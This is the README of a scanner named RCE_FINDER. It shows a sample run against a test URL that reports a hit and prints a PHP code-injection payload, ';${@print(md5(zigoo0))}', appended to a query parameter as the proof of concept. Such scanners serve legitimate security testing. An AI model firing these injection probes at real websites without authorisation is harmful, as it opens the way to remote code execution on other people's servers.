# RCE_FINDER

# How to use

root@kali:/rce_finder # python scan_rce.py

     # LOGO

        ##############################################################
        #|  By Rudra Sarkar - @rudr4_sarkar                          #
        #|  Loaded Modules : 1                                       #
        ##############################################################

 [!] Scan URL or List of URLs? [1/2]: 1
 
 [!] Enter the URL: https://www.test.com/testing?oqa=client_eh

 [!] Finding for Remote Code/Command Execution
 
 [!] Covering Operating Systems
 
 [!] Please wait ....


 [+] Vulnerablity Found . . .
 
 [+] Payload:  ;${@print(md5(zigoo0))}
 
 [+] POC: https://www.test.com/testing?oqa=client_eh;${@print(md5(zigoo0))}
